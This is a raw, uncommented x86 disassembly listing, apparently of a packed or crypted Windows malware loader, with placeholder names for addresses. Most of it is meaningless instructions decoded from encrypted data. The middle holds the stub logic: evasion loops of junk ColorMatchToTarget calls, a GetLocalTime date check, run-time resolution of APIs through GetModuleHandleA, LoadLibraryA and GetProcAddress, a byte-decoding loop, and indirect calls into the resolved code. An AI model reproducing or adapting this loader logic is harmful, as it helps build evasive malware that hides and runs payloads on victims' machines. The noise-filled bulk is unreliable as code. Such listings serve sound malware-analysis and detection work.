sbb al 0x1c
jae r-xdata
mov al [ 0x236685ff ]
jae r-xdata
jne r-xdata
jecxz r-xdata
movsd [ edi ] [ esi ]
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x89
cmp al 0x1c
jae r-xdata
jecxz r-xdata
daa
mov [ 0xffffffff80831d8b ] eax
push cs
mov ah 0x6a
movsd [ edi ] [ esi ]
xor [ ecx ] esp
push 0xffffffa6
pop ebp
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
movsb [ di ] [ si ]
test [ esi + 0x23 ] esp
add eax 0x3ae6a85
mov edx 0xb30ba66e
test [ edx - 0x5a ] ebp
push 0x6a85eba6
scasb [ edi ]
add [ edx ] ecx
inc [ esp + ebx ]
sbb al 0xb
bound ebp [ eax ]
sbb al 0x1c
mov edx 0xa2568ba
or al 0x52
sbb al 0x1c
jae r-xdata
push 0xffffffae
add edi [ edx - 0x4cf45992 ]
sbb esp [ esi + 0x1c ]
in al dx
or edx [ ecx + 0x38 ]
sbb al 0x1c
mov esi [ eax + esi * 8 - 0x3e ]
pop ebp
mov ah 0x6a
movsd [ edi ] [ esi ]
jmp r-xdata
daa
jecxz r-xdata
mov edx [ ebx + 0x5d ]
test al 0x6f
sbb al 0x54
pushad
daa
jae r-xdata
or edi ecx
and bl [ esp + ebx ]
or dl ch
push ds
and ebp esp
mov ebx eax
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] bl
mov ebx [ ebx ]
das
fsubr [ edx - 0x185a954c ]
or esi [ ebp + 0x38 ]
or esp [ esi + 0x38 ]
sbb al 0x1c
std
mov ah 0x6a
movsd [ edi ] [ esi ]
sti
or ebp [ 0xffffffff8b1c1c38 ]
out dx eax
dec esp
and [ edx - 0x4c ] dl
push 0xffffffa5
dec [ ebx ]
and edi [ eax ]
sbb al 0x1c
mov ebp [ esi ]
loope r-xdata
cwde
jae r-xdata
pushad
dec edx
cmp ebx [ esp + ebx ]
jae r-xdata
movsd [ edi ] [ esi ]
out 0xb eax
jne r-xdata
sti
or ch [ esi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ch 0xb5
jae r-xdata
retn
jae r-xdata
inc edi
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xb4
or al dl
push es
jae r-xdata
and ecx esp
or cl [ edx + 0x731c1c19 ]
jae r-xdata
sbb al 0x1c
mov eax [ ebx - 0x4b2abb9c ]
push 0x65
push ebx
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sub ch ah
jecxz r-xdata
mov ch 0x6e
jae r-xdata
mov bh 0x18
sbb al 0x1c
mov bl 0xb5
or dh dh
or ebx [ esp + ebx ]
jae r-xdata
mov ch 0xb5
jae r-xdata
sbb al 0x1c
jae r-xdata
cmp esp [ edi ]
push 0x65
push edi
jecxz r-xdata
cmp [ esp + ebx ] bl
mov ecx edx
test [ edx - 0x5a ] ebp
or edi [ ebx + 0x1c35e80a ]
sbb al 0x73
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push ebx
imul esp [ esi + 0x3a66b13 ] 0x6b
cmpsb [ esi ] [ edi ]
xor ebp [ ebx - 0x5a ]
and ebp [ esi - 0x52 ]
pop es
outsb
cmpsb [ esi ] [ edi ]
inc edi
and al 0xa6
pop es
test al 0xb5
scasb [ edi ]
test al 0x24
cmpsb [ esi ] [ edi ]
or esi [ ebp + 0x24b5a8ae ]
cmpsb [ esi ] [ edi ]
xrstor [ eax - 0x59db514b ]
aaa
scasb [ edi ]
mov al [ eax + 0x3ba62491 ]
mov [ eax + 0x2f0a858c ] ss
and eax 0x73731c1c
jae r-xdata
xor al 0x1c
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
jecxz r-xdata
test [ ebx ] 0x1c1c383f
mov esp [ edi - 0x68 ]
sbb eax 0xb40e8083
push 0xffffffa5
pushad
test [ eax - 0x27 ] esp
jecxz r-xdata
jecxz r-xdata
in al 0xe3
jae r-xdata
pop ecx
sbb al 0x1c
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
arpl [ esi ] bx
sbb al 0x1c
or bh [ edi + 0x22 ]
sbb al 0x1c
and cx [ edx ]
or dl [ ecx + 0x6 ]
jae r-xdata
and ebp esp
jmp r-xdata
xor eax 0x731c1c38
jae r-xdata
daa
in al dx
jae r-xdata
sbb al 0x73
jae r-xdata
sbb esp eax
scasb [ edi ]
mov dh 0x68
lss ecx [ edx ]
dec ecx
add ebx [ esp + ebx ]
jae r-xdata
aaa
xchg edi eax
test [ edx - 0x52 ] ebp
jae r-xdata
mov edx 0x160a9b89
xor eax 0x73731c1c
jae r-xdata
mov esi 0xf50bb42b
or bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
push es
jae r-xdata
mov ch 0xa
test [ ebx ] 0x1c
sbb al 0x73
jae r-xdata
sbb al 0x1c
or dl dh
cmp [ esp + ebx ] ebx
outsb
test [ ecx ] esi
push 0x961cd7a5
test [ ecx ] si
jae r-xdata
jae r-xdata
jae r-xdata
lodsb [ esi ]
out dx eax
sub ch ah
jmp r-xdata
sbb al 0x1c
jae r-xdata
push 0xffffffae
mov esp ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
or bl al
add ebx [ esp + ebx ]
sbb al 0x73
jae r-xdata
and bp sp
pushad
retn
and ecx [ edx ]
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
xor ebp [ esi - 0x5a ]
xor esi [ ebx + 0x1c51fe0a ]
sbb al 0x73
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
sbb eax 0x8a0a1c1c
sbb eax 0x5b731c1c
popfd
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
pop ebx
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push 0xbe6a853d
jmp 0xffffffff93509dfc
in al dx
push esp
movsd [ edi ] [ esi ]
in eax 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
sar [ ebx ] cl
sbb al 0x1c
jae r-xdata
or ecx [ 0x1c1c1c26 ]
popfd
call [ edx + 0x1c ]
xchg edi eax
or eax 0x1c1c1c26
jae r-xdata
push 0xffffffbe
sub esi [ ebx + ecx + 0x1c1c0af5 ]
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ 0x731c1c59 ]
jae r-xdata
sbb al 0xba
push 0x2a66efac
in al dx
and eax 0x1c52ff0b
mov esp ebx
shl ebx cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
aad 0x1e
jg r-xdata
xlat
mov al 0xb0
outsb
sbb al 0x96
push 0x961ceba6
or bl al
mov ebx esp
push 0x65
aas
jecxz r-xdata
sbb al 0x97
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
mov ah 0x6e
scasb [ edi ]
pop ds
or dh al
pop es
push 0x2a270a0f
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop di
sbb [ esp + ebx ] ebx
mov bl 0x6e
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x7751cb0 ]
jecxz r-xdata
mov al 0xb0
mov al 0x6e
jae r-xdata
test [ ebp + 0xaa5a0da ] 0x1c1c59d0
xor esp esp
jae r-xdata
mov dh 0x1f
or ah [ esi ]
push cs
sbb al 0x1c
jae r-xdata
push 0x52ff0b25
sbb al 0x1c
jae r-xdata
jae r-xdata
mov edx 0x66efac68
sub ch ah
in eax 0xb
jae r-xdata
mov ecx [ eax - 0x4f2cac4b ]
pop ds
sbb al 0x1c
or bl [ edx + 0x731c1c1f ]
or ebx [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0xa
fadd [ ebx ]
sbb al 0x1c
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
jae r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
mov esp ebp
pop ebp
dec eax
jae r-xdata
mov edx [ edx - 0x4f2cac4b ]
push 0xffffffe5
sbb al 0xa
jae r-xdata
sbb al 0x1c
jae r-xdata
mov [ rw-data ] 0x40c4
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jmp r-xdata
sbb al 0x1c
jae r-xdata
0x731c1c1f 0x5b0b
jae r-xdata
mov dh 0x68
mov [ rw-data ] 0x174
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665e4
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
inc [ rw-data ]
cmp [ rw-data ] 0x152f
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov ch 0x53
jae r-xdata
cmp ebx [ esp + ebx ]
pop ebx
jae r-xdata
jae r-xdata
mov [ rw-data ] 0x1774
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
mov [ rw-data ] 0x1
jmp r-xdata
retn 0x4
in eax 0x5d
shl [ eax + 0x1c4d1a0a ] cl
jae r-xdata
mov edx 0xaa323d0
cmp eax 0x731c1c24
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8cea
jne r-xdata
nop
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
nop
nop
mov eax 0x1c750735
call sub_4026bc
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x0
je r-xdata
or bl [ edx ]
jae r-xdata
or ecx [ eax + 0x3b ]
jae r-xdata
mov [ rw-data ] 0x1
dec ebp
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
mov ecx 0x73
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
sbb al 0x73
jae r-xdata
pop ss
loopne r-xdata
push 0xaee01baa
sbb al 0x8b
jae r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
mov [ ebp + 0xab0d353 ] dh
jae r-xdata
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1c74f007
jne r-xdata
call sub_403198
push ebx
jae r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
mov [ rw-data ] 0x1
sbb cl [ ebp + 0x1c ]
mov al 0xa
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8e8b
jne r-xdata
xor eax eax
mov [ rw-data ] eax
push rw-data
call [ rw-data ]
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jae r-xdata
push 0x1f
call sub_4060e8
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_460e24
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0xc
jbe r-xdata
nop
push 0x0
call sub_460eac
nop
nop
jmp r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
stosb [ edi ]
sub_462533
shl ebx 0x1c
jne r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
add al 0xe
sbb al 0x1c
jae r-xdata
jecxz r-xdata
or cl [ 0xffffffffbde3e3f2 ]
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
and ebp [ esi + 0x66 ]
pop edi
or dl [ edx - 0xe ]
jae r-xdata
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
fdiv st3
jecxz r-xdata
mov [ ebp + 0x13a66a85 ] eax
mov ebx 0xe3cc590a
in al dx
test [ ebp - 0x44ec5996 ] eax
or bl [ ecx - 0x34 ]
jecxz r-xdata
sbb al 0x89
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
adc ch bh
jae r-xdata
jae r-xdata
inc ecx
jae r-xdata
or edi [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x42 ] ebp
dec ebx
mov eax 0x49be6a85
mov ebp 0x73737320
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
or al [ esi - 0x76e3e3e2 ]
mov [ esi + 0x3fa66a85 ] ecx
or dl bh
jae r-xdata
jae r-xdata
popad
scasb [ edi ]
mul ebx
push 0xffffffa6
xor eax 0x17ae6a85
mov [ esi - 0x7a707645 ] eax
push 0xffffffa6
adc eax 0x1c0e040a
sbb al 0x73
jae r-xdata
jae r-xdata
and ebp esp
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
test [ edx - 0x42 ] ebp
outsb
sbb [ si ] bl
sbb al 0xa
out 0xc4 eax
jecxz r-xdata
or eax esp
fsub st3
jecxz r-xdata
bound ecx [ edi ]
dec edi
out 0xe3 eax
jecxz r-xdata
mov bl 0x89
jae r-xdata
jecxz r-xdata
test [ edx - 0x5a ] ebp
push edx
jae r-xdata
jae r-xdata
jae r-xdata
cmp edi [ ebx + 0x6a858e89 ]
push 0xffffffa6
aas
jae r-xdata
jecxz r-xdata
xlat
jae r-xdata
push esp
and bp sp
jecxz r-xdata
or dl [ edx ]
out dx eax
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
cmp [ ebp + 0x681dbe6a ] al
cmp [ ebp - 0x76bc4196 ] eax
nop
push 0xbe6a853a
sbb [ esp + ebx ] ebx
in al dx
inc eax
sbb ebx [ esp + ebx ]
or ch [ esi + 0x73e3e3f4 ]
jae r-xdata
jae r-xdata
xchg edi eax
retn
sbb esp edx
in al dx
dec eax
enter 0xe3e3 0xc2
mov edi 0xa76ef3c7
jecxz r-xdata
xor [ ecx ] cl
sbb al 0x1c
push 0x18d60b25
sbb al 0x1c
mov ebp esp
mov ecx [ ebx ]
loopne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0x8580893a
push 0xffffffbe
mov ebx eax
test [ edx - 0x52 ] ebp
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov [ eax - 0x1c0df2f6 ] edx
mov eax 0x6a859089
mov esi 0x6a85b84b
mov esi 0x893a6849
add [ ebp - 0x47b04196 ] 0x85
jae r-xdata
push 0xef27603b
salc
pushad
jecxz r-xdata
sbb al 0x1c
jae r-xdata
mov cl 0xa
mov [ ecx ] bl
or dh [ esp + ecx * 8 ]
in eax 0x8b
or esp eax
jecxz r-xdata
mov bl 0x89
jae r-xdata
out dx eax
pushad
jae r-xdata
or edi [ edx + 0x19880ab1 ]
scasb [ edi ]
push 0xffffffbe
inc ebp
xor bx [ esi ]
sbb al 0x1c
or bl [ ebx - 0x2a ]
jecxz r-xdata
cmp ah ch
pextrw esp mm3 0xe3
push 0x66f3c7af
sub ch ah
sbb al 0xa
inc edi
jmp r-xdata
and eax 0x1c18d60b
cmovg esp edi
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0xa
xor al 0xcc
jecxz r-xdata
movsb [ edi ] [ esi ]
retn
jae r-xdata
jae r-xdata
jae r-xdata
or [ edx ] 0x5a
retn
loope r-xdata
pushad
or dh [ eax ]
or [ esp + ebx ] ebx
sbb [ esp + ebx ] bl
or edx esi
jae r-xdata
add eax ebp
in al dx
jae r-xdata
in al dx
or dh [ ebx + 0x731c1c0c ]
imul esi [ edi + 0x1a6027fe ] 0xffffffc3
or dh ch
popad
jae r-xdata
inc edi
mov eax 0x6a859789
mov esi 0x9089b845
mov esi 0x85396841
push 0xffffffbe
jae r-xdata
mov eax 0x4dbe6a85
mov [ eax + 0x4fbe6a85 ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
add eax ebp
jae r-xdata
and al 0xa6
pushad
in al 0xe3
jecxz r-xdata
pushad
push 0xbe6a8539
outsb
dec edi
test [ edx - 0x42 ] ebp
jae r-xdata
or cl [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
sbb al 0x68
cmp esp [ eax + 0x27 ]
out dx eax
sbb al 0xb5
jmp r-xdata
outsb
cmpsb [ esi ] [ edi ]
cmp esp esp
jecxz r-xdata
mov al 0x1c
jne r-xdata
nop [ edx + edi * 4 ] ebx
pushad
jae r-xdata
or ah [ eax + 0x73e3e3f7 ]
or ah cl
loop r-xdata
mov esi 0x6a85b84f
mov esi 0xa90894d
jae r-xdata
sbb al bl
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
outsb
jecxz r-xdata
test [ edx - 0x5a ] ebp
adc edi [ ebx - 0x1c33a6f6 ]
sbb cl [ ebx - 0x3acb9e14 ]
jecxz r-xdata
mov bh 0xfe
daa
jecxz r-xdata
jecxz r-xdata
daa
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb esp edx
in al dx
in al 0xe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0xe0
in al dx
popad
sub esp esp
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffbe
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
scasd [ edi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
in al 0xe3
cmc
cmpsb [ esi ] [ edi ]
adc esi [ ebx + 0xbeba668 ]
nop [ edx + edi * 4 ] ebx
dec ebp
jae r-xdata
aaa
mov bl 0xa
mov bl 0xc
sbb al 0x1c
jae r-xdata
xchg [ edi ] bl
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
retn 0xc7bf
nop
jae r-xdata
call 0xb2a0bb6
sbb al 0xa
jae r-xdata
jae r-xdata
jae r-xdata
and eax esi
jecxz r-xdata
in al dx
call 0xb2a0bb6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0xbde3e3f2
jae r-xdata
jmp r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
adc [ esp + ebx ] bx
jae r-xdata
jae r-xdata
sbb al [ ebp + 0xa179e6a ]
or dl [ ecx + 0x68e3e3d3 ]
jae r-xdata
in al dx
jecxz r-xdata
mov eax 0xa668202a
add al 0x1c
rcr [ edx + ecx ] 0x1
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
mov esi 0x1a540b1f
jae r-xdata
lahf
mov edi 0x1967ece3
and ecx esp
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
fwait
shl ebx cl
jae r-xdata
jae r-xdata
jae r-xdata
cdq
int 0xe3
jecxz r-xdata
jae r-xdata
pushad
or ah [ esi + 0x11 ]
jae r-xdata
aas
push 0x9e6a851a
pop ss
or cl [ edi + 0x241c1c09 ]
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
daa
out dx eax
or bl [ eax + 0x731c1c0f ]
jae r-xdata
or edx [ edx + ebx + 0x1c ]
jae r-xdata
pushad
jae r-xdata
jae r-xdata
lodsb [ esi ]
jae r-xdata
cmpsd [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
out 0xe3 al
jae r-xdata
and al 0xa6
daa
mov ch 0xae
xchg esp eax
loopne r-xdata
and esp [ ebx + 0x7373202a ]
jae r-xdata
or bl [ ebx + 0x73e3e3e6 ]
sbb al 0xec
jae r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
add eax 0x73e3e3c0
out 0xc6 al
sbb al 0xec
jae r-xdata
pushad
sbb bl [ esp + ebx ]
jae r-xdata
outsb
jae r-xdata
and ah ch
in al 0xe3
jecxz r-xdata
cmp al bl
adc [ edx ] cl
stosb [ edi ]
or bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
adc al 0xa
movsd [ edi ] [ esi ]
adc [ esp + ebx ] bl
or bl [ ecx ]
jpo r-xdata
jae r-xdata
loop r-xdata
pushad
in al dx
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
pop ds
sbb al 0x1c
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x60
jmp r-xdata
mov ebp 0x68202ab8
cmpsb [ esi ] [ edi ]
or bh dl
push 0xffffffbe
inc ebx
or dh bh
or [ esp + ebx ] bl
jae r-xdata
sbb al 0x54
jecxz r-xdata
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
push ebx
mov bl 0x6e
xchg [ esp + ebx ] bx
sbb al 0xb3
or al [ 0x73e3e3c0 ]
loop r-xdata
mov al 0xb3
outsb
jecxz r-xdata
mov dh 0x68
punpckldq mmx1 [ edi ]
test [ edx - 0x5a ] ebp
jecxz r-xdata
out 0xc6 al
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x74
jae r-xdata
xor [ ebx + 0xabacd89 ] edi
push 0xa66a8521
jecxz r-xdata
outsb
pop edi
outsd
bound ecx [ edi ]
and edx [ ebx + edi ]
sub ah [ eax ]
jecxz r-xdata
in al dx
sbb edi eax
jecxz r-xdata
pop ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
outsd
push ds
sbb al 0x1c
test [ edx - 0x62 ] ebp
jne r-xdata
mov al 0xb5
mov ah 0x89
xchg ebx eax
mov esp 0x24689189
test [ edx - 0x5a ] ebp
popad
adc edi edi
jecxz r-xdata
sbb al 0x73
in al dx
in ax 0xe3
jecxz r-xdata
and [ ebp - 0x44ce5996 ] eax
mov ebp ecx
mov edx 0x1c04ac0a
loope r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
inc edi
jae r-xdata
push 0xffffffbe
jae r-xdata
int3
cli
xchg ecx eax
in al dx
shl bl 0xe3
jae r-xdata
mov ebp [ edx - 0x4b82cf98 ]
push 0xffffffa5
or ebp esi
int1
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
mov bl 0xb5
or esp ecx
and bp sp
pop esi
jae r-xdata
daa
jecxz r-xdata
push esp
shl [ ebx ] 0x1
mov [ 0xffffffffe3f8fa0a ] eax
jecxz r-xdata
and edi [ ebp - 0x1c186ff6 ]
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
push 0xffffffa7
jae r-xdata
push 0xffffffa7
pushad
xchg edi eax
or cl [ ebx - 0x3 ]
jecxz r-xdata
push ebp
mov al [ 0x650ab3db ]
jecxz r-xdata
jecxz r-xdata
mov al 0x1c
xchg edi eax
jecxz r-xdata
sub ah [ eax ]
sbb al 0x96
jae r-xdata
mov bl 0xd0
adc eax 0xe3cdaa0a
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
sbb eax 0x1c1f730a
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
sbb al 0x1c
jae r-xdata
shl [ ebx ] 0x1
mov esp 0x1c0f790a
or dh [ ebp + 0x14 ]
jecxz r-xdata
shl [ ebx ] 0x1
mov ebp 0xe3e7900a
jae r-xdata
push esp
jae r-xdata
jae r-xdata
or edi eax
int1
jecxz r-xdata
or bl [ ebx + 0x8 ]
sbb al 0x1c
jae r-xdata
loope r-xdata
push 0xe2f3c7a7
cmpsd [ esi ] [ edi ]
sbb al 0x60
jae r-xdata
jecxz r-xdata
pop ds
jae r-xdata
je r-xdata
jae r-xdata
jecxz r-xdata
xchg [ edi - 0x59db3271 ] ecx
pop ds
xchg [ edi - 0x4ce31c71 ] ecx
fwait
adc al 0x3b
clc
push 0xeb0f620f
loope r-xdata

jecxz r-xdata
or edi ebp
jae r-xdata
jne r-xdata
jne r-xdata
jecxz r-xdata
jmp r-xdata
or al 0x1c
jae r-xdata
jecxz r-xdata
push 0xffffffa6
sbb al 0x1c
sbb [ edx ] ecx
test [ edx - 0x5a ] ebp
sbb al 0xa
jae r-xdata
and ebp esp
pop ss
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
push ebx
xor ah dh
jecxz r-xdata
mov ebx esp
sbb al 0x75
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
xchg ebp eax
sbb esp [ ebx - 0x1c149e14 ]
jecxz r-xdata
outsb
sbb ebx [ esi ]
sbb al 0x1c
or ebp [ ebx ]
sbb [ esp + ebx ] bl
pushad
push 0xffffffa6
mov dh 0xa
fsincos
jecxz r-xdata
xchg ebp eax
xchg esi eax
jae r-xdata
idiv [ ebx - 0x1c0455f6 ]
jecxz r-xdata
mov ch 0xb4
jecxz r-xdata
xchg ebp eax
mov eax 0x961c202a
and edi [ edx + 0x1bbe6aba ]
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov al 0xb5
mov ah 0x89
cmp [ ecx - 0x25f56a77 ] 0x6
jecxz r-xdata
sbb eax 0xe3d3a50a
test [ ebp - 0x44e45996 ] eax
mov ebp ecx
test [ edx - 0x5a ] ebp
sbb [ ebx + 0x1fa66a85 ] edi
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
jecxz r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
shl esp cl
jae r-xdata
jmp 0x2daf0c7c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sub cl [ edx ]
mov esp ss
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov ch 0xb4
mov [ edx + 0xa9589b9 ] eax
fiadd [ esi ]
or cl [ ebx + 0x731c1c0c ]
mov ebx 0x1c18b40a
sbb al 0x73
sbb al 0x75
dec edi
sub ah [ eax ]
jae r-xdata
mov [ ebx + 0x689189bc ] edx
and al 0x85
push 0xffffffa6
sbb bx [ esi ]
sbb al 0x1c
or ch [ edi ]
or al 0x1c
pop edi
jae r-xdata
mov dh 0x68
sbb al 0x96
test [ esi + 0x15 ] esp
or dh [ edi - 0x12 ]
jecxz r-xdata
rcl [ 0xffffffffe3cdaa0a ] 0x1
or bh [ ecx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
or [ esp + ebx ] bl
adc ax 0x770a
out dx al
mov bl 0x89
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
xchg esi eax
outsb
adc ebx [ esp + ebx ]
jae r-xdata
outsb
sbb ebx [ esi ]
sbb al 0x1c
or edi edx
push ds
in eax dx
cmc
jecxz r-xdata
jae r-xdata
or dl [ ebx ]
nop [ ebx + esi * 2 ] ebx
jae r-xdata
pop es
sbb al 0x96
mov bl 0xb0
or bh [ ebx + ecx * 8 + 0x7373e3e3 ]
test [ edx - 0x42 ] ebp
sbb al 0x95
in al dx
or esi [ edi ]
jae r-xdata
and al 0xa6
jae r-xdata
jae r-xdata
jae r-xdata
popad
jmp r-xdata
jecxz r-xdata
dec edi
daa
or dh bh
outsb
mov bh 0xa
stosb [ edi ]
jecxz r-xdata
sbb al 0x95
mov bl 0x1c
nop [ ebx + esi * 2 ] ebx
jae r-xdata
xchg ecx eax
jae r-xdata
jae r-xdata
sti
sbb al 0xb5
xchg edi eax
or bl [ esi ]
loope r-xdata
jae r-xdata
enter 0xe3e3 0x73
cmpsb [ esi ] [ edi ]
aas
mov [ eax - 0x59db7a74 ] ss
add edx [ edi + 0x2495abc3 ]
cmpsb [ esi ] [ edi ]
cmp dl [ 0xffffffffb8bc1c1c ]
jae r-xdata
jecxz r-xdata
mov ebp [ eax + ecx ]
or eax [ esi ]
in al dx
jecxz r-xdata
or bl bl
or eax 0xbfa56ab4
or dh [ ebp + 0x17 ]
in al dx
jecxz r-xdata
jae r-xdata
or bl dl
push es
push 0xef0f600f
and ecx [ ebp + 0xaaeaeb5 ]
xchg ecx eax
jae r-xdata
or bh [ edx ]
adc eax 0xb8bc1c1c
cmpsb [ esi ] [ edi ]
jmp r-xdata
mov ah 0x18
and [ ebx + 0x73 ] dh
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x97
jecxz r-xdata
daa
out dx eax
mov esp ebx
arpl bx sp
jecxz r-xdata
push ds
sbb al 0x1c
or dl bl
hlt
retn
jae r-xdata
jae r-xdata
or cl [ ecx ]
sbb [ esp + ebx ] bl
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6f656ab4
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
dec edx
adc [ esp + ebx ] bl
jae r-xdata
push 0xffffffa5
mov ebx 0xe3ec100b
jecxz r-xdata
jae r-xdata
mov ch 0xae
scasb [ edi ]
or dl [ ecx + 0x73e3e3c8 ]
bound ecx [ edi ]
shl ecx cl
jae r-xdata
pop ss
push 0x961ceba6
jae r-xdata
jecxz r-xdata
jae r-xdata
xlat
test [ edx - 0x4a ] ebp
iretd
and al 0xa
aas
leave
jecxz r-xdata
